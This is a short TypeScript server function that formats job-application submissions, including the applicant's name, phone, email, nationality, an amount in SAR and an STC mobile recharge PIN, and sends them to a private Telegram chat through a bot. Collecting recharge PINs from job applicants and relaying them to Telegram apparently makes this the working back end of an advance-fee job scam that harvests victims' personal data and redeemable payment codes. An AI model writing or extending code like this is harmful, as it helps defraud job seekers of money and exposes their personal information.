import { createServerFn } from "@tanstack/react-start";

export type TelegramPayload = {
  application_id: string;
  job_title: string;
  company_name: string;
  full_name: string;
  phone: string;
  email: string | null;
  nationality: string | null;
  amount_paid: number;
  recharge_pin: string;
};

export const notifyTelegram = createServerFn({ method: "POST" })
  .inputValidator((d: TelegramPayload) => d)
  .handler(async ({ data }) => {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      console.warn("[telegram] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set");
      return { ok: false, skipped: true };
    }

    const text =
      `🆕 *New Job Application*\n\n` +
      `*ID:* \`${data.application_id}\`\n` +
      `*Job:* ${escape(data.job_title)}\n` +
      `*Company:* ${escape(data.company_name)}\n` +
      `\n👤 *Applicant*\n` +
      `Name: ${escape(data.full_name)}\n` +
      `Phone: ${escape(data.phone)}\n` +
      (data.email ? `Email: ${escape(data.email)}\n` : "") +
      (data.nationality ? `Nationality: ${escape(data.nationality)}\n` : "") +
      `\n💳 *Payment*\n` +
      `Amount: ${data.amount_paid} SAR\n` +
      `STC PIN: \`${escape(data.recharge_pin)}\`\n` +
      `\n_Verify the PIN in the admin panel._`;

    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" }),
    });
    if (!res.ok) {
      const body = await res.text();
      console.error("[telegram] sendMessage failed", res.status, body);
      return { ok: false, error: `Telegram ${res.status}` };
    }
    return { ok: true };
  });

function escape(s: string): string {
  return s.replace(/[_*[\]()~`>#+=|{}.!-]/g, (m) => `\\${m}`);
}